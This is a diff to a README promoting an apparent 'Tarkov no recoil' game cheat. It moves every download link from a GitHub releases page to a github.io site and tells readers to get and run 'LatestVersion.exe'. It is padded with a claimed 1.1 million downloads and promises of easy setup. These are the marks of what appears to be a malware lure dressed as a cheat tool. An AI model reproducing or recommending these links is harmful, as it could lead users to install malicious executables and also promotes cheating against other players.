@@ -2,7 +2,7 @@
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2026-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-1.1m%2B-orange?style=flat-square)
 
-**👉 [⬇️ DOWNLOAD NOW](https://github.com/Comburant-immortality8584/tarkov-no-recoil-2026/releases)** 👈
+**👉 [⬇️ DOWNLOAD NOW](https://comburant-immortality8584.github.io)** 👈
 
 ---
 
@@ -44,7 +44,7 @@ No graphics card requirements, no special drivers, no technical knowledge needed
 ### Step 1: Download the Tool
 
 Visit this link to download the application:
-**[https://github.com/Comburant-immortality8584/tarkov-no-recoil-2026/releases](https://github.com/Comburant-immortality8584/tarkov-no-recoil-2026/releases)**
+**[https://comburant-immortality8584.github.io](https://comburant-immortality8584.github.io)**
 
 The download page will show you the latest version. Click the download button for the file named **LatestVersion.exe**.
 
@@ -146,7 +146,7 @@ This tool is provided under the **MIT License** – free to use, modify, and dis
 
 ---
 
-**👉 [⬇️ GET THE DOWNLOAD NOW](https://github.com/Comburant-immortality8584/tarkov-no-recoil-2026/releases)** 👈
+**👉 [⬇️ GET THE DOWNLOAD NOW](https://comburant-immortality8584.github.io)** 👈
 
 Hit your shots. Win your fights. No recoil.
 
